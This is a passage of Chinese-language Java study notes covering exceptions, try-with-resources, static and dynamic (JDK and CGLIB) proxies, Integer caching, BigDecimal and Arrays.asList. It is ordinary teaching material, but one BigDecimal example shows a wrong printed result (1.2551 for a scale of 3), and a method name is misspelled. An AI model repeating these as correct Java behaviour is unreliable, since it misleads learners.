class="line">Class&lt;Integer&gt; type = Integer.TYPE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得父类的class</span></span><br><span class="line">a.getSuperClass()</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="异常类层次结构图"><a href="#异常类层次结构图" class="headerlink" title="异常类层次结构图"></a>异常类层次结构图</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848033.png" alt="img"></p>
<p>在 Java 中，所有的异常都有一个共同的祖先 java.lang 包中的 Throwable 类。Throwable 类有两个重要的子类 Exception（异常）和 Error（错误）。Exception 能被程序本身处理(try-catch)， Error 是无法处理的(只能尽量避免)。</p>
<ul>
<li>Exception : 程序本身可以处理的异常，可以通过 catch 来进行捕获。Exception 又可以分为 受检查异常(必须处理, 不然编译会报错) 和 不受检查异常(可以不处理)。</li>
<li>Error ：Error 属于程序无法处理的错误 ，我们没办法通过 catch 来进行捕获 。例如，Java 虚拟机运行错误（Virtual MachineError）、虚拟机内存不够错误(OutOfMemoryError)、类定义错误（NoClassDefFoundError）等 。这些异常发生时，Java 虚拟机（JVM）一般会选择线程终止。</li>
</ul>
<p><strong>受检异常</strong></p>
<p>除了RuntimeException及其子类以外，其他的Exception类及其子类都属于受检查异常 。常见的受检查异常有： IO 相关的异常、ClassNotFoundException 、SQLException…。</p>
<p><strong>不受检异常</strong></p>
<p>Java 代码在编译过程中 ，我们即使不处理不受检查异常也可以正常通过编译。</p>
<p>RuntimeException 及其子类都统称为非受检查异常，例如：NullPointerException、NumberFormatException（字符串转换为数字）、ArrayIndexOutOfBoundsException（数组越界）、ClassCastException（类型转换错误）、ArithmeticException（算术错误）等。</p>
<h4 id="Throwable类常用方法"><a href="#Throwable类常用方法" class="headerlink" title="Throwable类常用方法"></a>Throwable类常用方法</h4><ul>
<li>public string getMessage():返回异常发生时的简要描述</li>
<li>public string toString():返回异常发生时的详细信息</li>
<li>public string getLocalizedMessage():返回异常对象的本地化信息。使用 Throwable 的子类覆盖这个方法，可以生成本地化信息。如果子类没有覆盖该方法，则该方法返回的信息与 getMessage（）返回的结果相同</li>
<li>public void printStackTrace():在控制台上打印 Throwable 对象封装的异常信息</li>
</ul>
<h4 id="try-catch-finally"><a href="#try-catch-finally" class="headerlink" title="try-catch-finally"></a>try-catch-finally</h4><ul>
<li>try块： 用于捕获异常。其后可接零个或多个 catch 块，如果没有 catch 块，则必须跟一个 finally 块。</li>
<li>catch块： 用于处理 try 捕获到的异常。</li>
<li>finally 块： 无论是否捕获或处理异常，finally 块里的语句都会被执行。当在 try 块或 catch块中遇到 return 语句时，finally 语句块将在方法返回之前被执行。</li>
</ul>
<p>在以下 3 种特殊情况下,finally块不会被执行：</p>
<ol>
<li>在 try 或 finally块中用了 System.exit(int)退出程序。但是，如果 System.exit(int) 在异常语句之后，finally 还是会被执行</li>
<li>程序所在的线程死亡。</li>
<li>关闭 CPU。</li>
</ol>
<p><strong>注意：</strong> 当 try 语句和 finally 语句中都有 return 语句时，在方法返回之前，finally 语句的内容将被执行，并且 finally 语句的返回值将会覆盖原始的返回值。如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> value * value;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果调用 f(2)，返回值将是 0，因为 finally 语句的返回值覆盖了 try 语句块的返回值。</p>
<h4 id="使用try-with-resources来代替try-catch-finally"><a href="#使用try-with-resources来代替try-catch-finally" class="headerlink" title="使用try-with-resources来代替try-catch-finally"></a>使用try-with-resources来代替try-catch-finally</h4><ol>
<li>适用范围（资源的定义）： 任何实现 java.lang.AutoCloseable或者 java.io.Closeable 的对象</li>
<li>关闭资源和 final 的执行顺序： 在 try-with-resources 语句中，任何 catch 或 finally 块在声明的资源关闭后运行</li>
</ol>
<p>《Effecitve Java》中明确指出：</p>
<blockquote>
<p>面对必须要关闭的资源，我们总是应该优先使用 try-with-resources 而不是try-finally。随之产生的代码更简短，更清晰，产生的异常对我们也更有用。try-with-resources语句让我们更容易编写必须要关闭的资源的代码，若采用try-finally则几乎做不到这点。</p>
</blockquote>
<p>当然多个资源需要关闭的时候，使用 try-with-resources 实现起来也非常简单, 通过使用分号分隔，可以在try-with-resources块中声明多个资源。</p>
<h4 id="既然有了字节流-为什么还要有字符流"><a href="#既然有了字节流-为什么还要有字符流" class="headerlink" title="既然有了字节流,为什么还要有字符流?"></a>既然有了字节流,为什么还要有字符流?</h4><p>问题本质想问：<strong>不管是文件读写还是网络发送接收，信息的最小存储单元都是字节，那为什么 I&#x2F;O 流操作要分为字节流操作和字符流操作呢？</strong></p>
<p>回答：Java中一切都是字节流，没有字符流，字符只是根据编码对字节流进行翻译的结果。字符流是由 Java 虚拟机将字节转换得到的，问题就出在这个过程还算是非常耗时，并且，如果我们不知道编码类型就很容易出现乱码问题。所以， I&#x2F;O 流就干脆提供了一个直接操作字符的接口，方便我们平时对字符进行流操作。如果音频文件、图片等媒体文件用字节流比较好，如果涉及到字符的话使用字符流比较好。</p>
<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理中，我们对目标对象的每个方法的增强都是手动完成的（后面会具体演示代码），非常不灵活（比如接口一旦新增加方法，目标对象和代理对象都要进行修改）且麻烦(需要对每个目标类都单独写一个代理类)。 实际应用场景非常非常少，日常开发几乎看不到使用静态代理的场景。</p>
<p>上面我们是从实现和应用角度来说的静态代理，从 JVM 层面来说， 静态代理在编译时就将接口、实现类、代理类这些都变成了一个个实际的 class 文件。</p>
<p>静态代理实现步骤:</p>
<ol>
<li>定义一个接口及其实现类；</li>
<li>创建一个代理类同样实现这个接口</li>
<li>将目标对象注入进代理类，然后在代理类的对应方法调用目标类中的对应方法。这样的话，我们就可以通过代理类屏蔽对目标对象的访问，并且可以在目标方法执行前后做一些自己想做的事情。</li>
</ol>
<p>下面通过代码展示！</p>
<p><strong>1.定义发送短信的接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    String <span class="title function_">send</span><span class="params">(String message)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.实现发送短信的接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;send message:&quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.创建代理类并同样实现发送短信的接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsProxy</span> <span class="keyword">implements</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SmsService smsService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SmsProxy</span><span class="params">(SmsService smsService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.smsService = smsService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        <span class="comment">//调用方法之前，我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before method send()&quot;</span>);</span><br><span class="line">        smsService.send(message);</span><br><span class="line">        <span class="comment">//调用方法之后，我们同样可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;after method send()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>4.实际使用</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SmsService</span> <span class="variable">smsService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsServiceImpl</span>();</span><br><span class="line">        <span class="type">SmsProxy</span> <span class="variable">smsProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsProxy</span>(smsService);</span><br><span class="line">        smsProxy.send(<span class="string">&quot;java&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行上述代码之后，控制台打印出：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">before method send()</span><br><span class="line">send message:java</span><br><span class="line">after method send()</span><br></pre></td></tr></table></figure>

<p>可以输出结果看出，我们已经增加了 <code>SmsServiceImpl</code> 的<code>send()</code>方法。</p>
<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>相比于静态代理来说，动态代理更加灵活。我们不需要针对每个目标类都单独创建一个代理类，并且也不需要我们必须实现接口，我们可以直接代理实现类( <em>CGLIB 动态代理机制</em>)。</p>
<p><strong>从 JVM 角度来说，动态代理是在运行时动态生成类字节码，并加载到 JVM 中的。</strong></p>
<p>Spring AOP、RPC 框架实现都依赖了动态代理。</p>
<p><strong>动态代理在我们日常开发中使用的相对较小，但是在框架中的几乎是必用的一门技术。学会了动态代理之后，对于我们理解和学习各种框架的原理也非常有帮助。</strong></p>
<p>就 Java 来说，动态代理的实现方式有很多种，比如 <strong>JDK 动态代理</strong>、<strong>CGLIB 动态代理</strong>等等。t</p>
<h3 id="jdk动态代理机制"><a href="#jdk动态代理机制" class="headerlink" title="jdk动态代理机制"></a>jdk动态代理机制</h3><ol>
<li>定义一个接口及其实现类；</li>
<li>自定义 InvocationHandler 并重写invoke方法，在 invoke 方法中我们会调用原生方法（被代理类的方法）并自定义一些处理逻辑；</li>
<li>通过 Proxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h) 方法创建代理对象；</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义发送短信的接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    String <span class="title function_">send</span><span class="params">(String message)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 实现发送短信的接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">SmsService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;send message:&quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义一个JDK动态代理类</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DebugInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代理类中的真实对象</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object target;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DebugInvocationHandler</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//invoke() 方法: 当我们的动态代理对象调用原生方法的时候，最终实际上调用到的是 invoke() 方法，然后 invoke() 方法代替我们去调用了被代理对象的原生方法。</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//调用方法之前，我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before method &quot;</span> + method.getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(target, args);</span><br><span class="line">        <span class="comment">//调用方法之后，我们同样可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;after method &quot;</span> + method.getName());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取代理对象的工厂类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdkProxyFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProxy</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">                target.getClass().getClassLoader(), <span class="comment">// 目标类的类加载</span></span><br><span class="line">                target.getClass().getInterfaces(),  <span class="comment">// 代理需要实现的接口，可指定多个</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">DebugInvocationHandler</span>(target)   <span class="comment">// 代理对象对应的自定义 InvocationHandler</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实际使用</span></span><br><span class="line"><span class="type">SmsService</span> <span class="variable">smsService</span> <span class="operator">=</span> (SmsService) JdkProxyFactory.getProxy(<span class="keyword">new</span> <span class="title class_">SmsServiceImpl</span>());</span><br><span class="line">smsService.send(<span class="string">&quot;java&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CGLIB动态代理机制"><a href="#CGLIB动态代理机制" class="headerlink" title="CGLIB动态代理机制"></a>CGLIB动态代理机制</h3><p>JDK动态代理有一个最致命的问题是其只能代理实现了接口的类.可以使用CGLIB动态代理机制来避免.</p>
<p>CGLIB(Code Generation Library)是一个基于ASM的字节码生成库，它允许我们在运行时对字节码进行修改和动态生成。CGLIB 通过继承方式实现代理。很多知名的开源框架都使用到了CGLIB， 例如 Spring 中的 AOP 模块中：如果目标对象实现了接口，则默认采用 JDK 动态代理，否则采用 CGLIB 动态代理。</p>
<p>在 CGLIB 动态代理机制中 MethodInterceptor 接口和 Enhancer 类是核心。</p>
<p>你需要自定义 MethodInterceptor 并重写 intercept 方法，intercept 用于拦截增强被代理类的方法。</p>
<ol>
<li>定义一个类；</li>
<li>自定义 MethodInterceptor 并重写 intercept 方法，intercept 用于拦截增强被代理类的方法，和 JDK 动态代理中的 invoke 方法类似；</li>
<li>通过 Enhancer 类的 create()创建代理类；</li>
</ol>
<p>不同于 JDK 动态代理不需要额外的依赖。CGLIB(Code Generation Library) 实际是属于一个开源项目，如果你要使用它的话，需要手动添加相关依赖。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cglib<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cglib<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>1.实现一个使用阿里云发送短信的类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> github.javaguide.dynamicProxy.cglibDynamicProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AliSmsService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">send</span><span class="params">(String message)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;send message:&quot;</span> + message);</span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.自定义 MethodInterceptor（方法拦截器）</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.MethodInterceptor;</span><br><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.MethodProxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义MethodInterceptor</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DebugMethodInterceptor</span> <span class="keyword">implements</span> <span class="title class_">MethodInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> o           被代理的对象（需要增强的对象）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> method      被拦截的方法（需要增强的方法）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> args        方法入参</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> methodProxy 用于调用原始方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">intercept</span><span class="params">(Object o, Method method, Object[] args, MethodProxy methodProxy)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">//调用方法之前，我们可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before method &quot;</span> + method.getName());</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> methodProxy.invokeSuper(o, args);</span><br><span class="line">        <span class="comment">//调用方法之后，我们同样可以添加自己的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;after method &quot;</span> + method.getName());</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.获取代理类</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> net.sf.cglib.proxy.Enhancer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CglibProxyFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProxy</span><span class="params">(Class&lt;?&gt; clazz)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建动态代理增强类</span></span><br><span class="line">        <span class="type">Enhancer</span> <span class="variable">enhancer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Enhancer</span>();</span><br><span class="line">        <span class="comment">// 设置类加载器</span></span><br><span class="line">        enhancer.setClassLoader(clazz.getClassLoader());</span><br><span class="line">        <span class="comment">// 设置被代理类</span></span><br><span class="line">        enhancer.setSuperclass(clazz);</span><br><span class="line">        <span class="comment">// 设置方法拦截器</span></span><br><span class="line">        enhancer.setCallback(<span class="keyword">new</span> <span class="title class_">DebugMethodInterceptor</span>());</span><br><span class="line">        <span class="comment">// 创建代理类</span></span><br><span class="line">        <span class="keyword">return</span> enhancer.create();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;Copy to clipboardErrorCopied</span><br></pre></td></tr></table></figure>

<p><strong>4.实际使用</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AliSmsService</span> <span class="variable">aliSmsService</span> <span class="operator">=</span> (AliSmsService) CglibProxyFactory.getProxy(AliSmsService.class);</span><br><span class="line">aliSmsService.send(<span class="string">&quot;java&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="JDK动态代理和CGLIB动态代理对比"><a href="#JDK动态代理和CGLIB动态代理对比" class="headerlink" title="JDK动态代理和CGLIB动态代理对比"></a>JDK动态代理和CGLIB动态代理对比</h3><ol>
<li><strong>JDK 动态代理只能只能代理实现了接口的类或者直接代理接口，而 CGLIB 可以代理未实现任何接口的类。</strong> 另外， CGLIB 动态代理是通过生成一个被代理类的子类来拦截被代理类的方法调用，因此不能代理声明为 final 类型的类和方法。</li>
<li>就二者的效率来说，大部分情况都是 JDK 动态代理更优秀，随着 JDK 版本的升级，这个优势更加明显。</li>
</ol>
<h3 id="动态代理和静态代理的对比"><a href="#动态代理和静态代理的对比" class="headerlink" title="动态代理和静态代理的对比"></a>动态代理和静态代理的对比</h3><ol>
<li><strong>灵活性</strong> ：动态代理更加灵活，不需要必须实现接口，可以直接代理实现类，并且可以不需要针对每个目标类都创建一个代理类。另外，静态代理中，接口一旦新增加方法，目标对象和代理对象都要进行修改，这是非常麻烦的！</li>
<li><strong>JVM 层面</strong> ：静态代理在编译时就将接口、实现类、代理类这些都变成了一个个实际的 class 文件。而动态代理是在运行时动态生成类字节码，并加载到 JVM 中的。</li>
</ol>
<h2 id="整型包装类值的比较"><a href="#整型包装类值的比较" class="headerlink" title="整型包装类值的比较"></a>整型包装类值的比较</h2><p>所有整型包装类对象值的比较必须使用equals方法。</p>
<p>所有的 POJO 类属性必须使用包装数据类型。</p>
<p>RPC 方法的返回值和参数必须使用包装数据类型。</p>
<p>所有的局部变量使用基本数据类型。</p>
<p>先看下面这个例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">System.out.println(x == y);<span class="comment">// true</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">3</span>);</span><br><span class="line"><span class="type">Integer</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">3</span>);</span><br><span class="line">System.out.println(a == b);<span class="comment">//false</span></span><br><span class="line">System.out.println(a.equals(b));<span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>当使用自动装箱方式创建一个Integer对象时，当数值在-128 ~127时，会将创建的 Integer 对象缓存起来，当下次再出现该数值时，直接从缓存中取出对应的Integer对象。所以上述代码中，x和y引用的是相同的Integer对象。 </p>
<p><strong>注意：</strong> 如果你的IDE(IDEA&#x2F;Eclipse)上安装了阿里巴巴的p3c插件，这个插件如果检测到你用 &#x3D;&#x3D;的话会报错提示</p>
<h2 id="BigDecimal"><a href="#BigDecimal" class="headerlink" title="BigDecimal"></a>BigDecimal</h2><p>我们在使用BigDecimal时，为了防止精度丢失，推荐使用它的 <strong>BigDecimal(String)</strong> 构造方法来创建对象。</p>
<p>BigDecimal 主要用来操作（大）浮点数，BigInteger 主要用来操作大整数（超过 long 类型）。</p>
<p>BigDecimal 的实现利用到了 BigInteger, 所不同的是 BigDecimal 加入了小数位的概念</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">float</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">1.0f</span> - <span class="number">0.9f</span>;</span><br><span class="line"><span class="type">float</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0.9f</span> - <span class="number">0.8f</span>;</span><br><span class="line">System.out.println(a);<span class="comment">// 0.100000024</span></span><br><span class="line">System.out.println(b);<span class="comment">// 0.099999964</span></span><br><span class="line">System.out.println(a == b);<span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;1.0&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;0.9&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;0.8&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">x</span> <span class="operator">=</span> a.subtract(b); </span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">y</span> <span class="operator">=</span> b.subtract(c); </span><br><span class="line">System.out.println(x); <span class="comment">/* 0.1 */</span></span><br><span class="line">System.out.println(y); <span class="comment">/* 0.1 */</span></span><br><span class="line">System.out.println(Objects.equals(x, y)); <span class="comment">/* true */</span></span><br><span class="line"></span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;1.0&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;0.9&quot;</span>);</span><br><span class="line">System.out.println(a.compareTo(b));<span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BigDecimal</span>(<span class="string">&quot;1.255433&quot;</span>);</span><br><span class="line"><span class="type">BigDecimal</span> <span class="variable">n</span> <span class="operator">=</span> m.setScale(<span class="number">3</span>,BigDecimal.ROUND_HALF_DOWN);</span><br><span class="line">System.out.println(n);<span class="comment">// 1.2551</span></span><br></pre></td></tr></table></figure>

<h2 id="Arrays-asList"><a href="#Arrays-asList" class="headerlink" title="Arrays.asList()"></a>Arrays.asList()</h2><p>Arrays.asList()将数组转换为集合后,底层其实还是数组</p>
<p>Arrays.asList()是泛型方法，传入的对象必须是对象数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] myArray = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line"><span class="type">List</span> <span class="variable">myList</span> <span class="operator">=</span> Arrays.asList(myArray);</span><br><span class="line">System.out.println(myList.size());<span class="comment">//1</span></span><br><span class="line">System.out.println(myList.get(<span class="number">0</span>));<span class="comment">//数组地址值</span></span><br><span class="line">System.out.println(myList.get(<span class="number">1</span>));<span class="comment">//报错：ArrayIndexOutOfBoundsException</span></span><br><span class="line"><span class="type">int</span>[] array = (<span class="type">int</span>[]) myList.get(<span class="number">0</span>);</span><br><span class="line">System.out.println(array[<span class="number">0</span>]);<span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<p>当传入一个原生数据类型数组时，<code>Arrays.asList()</code> 的真正得到的参数就不是数组中的元素，而是数组对象本身！此时List 的唯一元素就是这个数组，这也就解释了上面的代码。</p>
<p>我们使用包装类型数组就可以解决这个问题。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer[] myArray = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>使用集合的修改方法:add()、remove()、clear()会抛出异常。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">myList</span> <span class="operator">=</span> Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">myList.add(<span class="number">4</span>);<span class="comment">//运行时报错：UnsupportedOperationException</span></span><br><span class="line">myList.remove(<span class="number">1</span>);<span class="comment">//运行时报错：UnsupportedOperationException</span></span><br><span class="line">myList.clear();<span class="comment">//运行时报错：UnsupportedOperationException</span></span><br></pre></td></tr></table></figure>

<p>Arrays.asList() 方法返回的并不是 java.util.ArrayList ，而是 java.util.Arrays 的一个内部类,这个内部类并没有实现集合的修改方法或者说并没有重写这些方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">List</span> <span class="variable">myList</span> <span class="operator">=</span> Arrays.asList(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">System.out.println(myList.getClass());<span class="comment">//class java.util.Arrays$ArrayList</span></span><br></pre></td></tr></table></figure>

<p>下图是java.util.Arrays$ArrayList的简易源码，我们可以看到这个类重写的方法有哪些。</p>
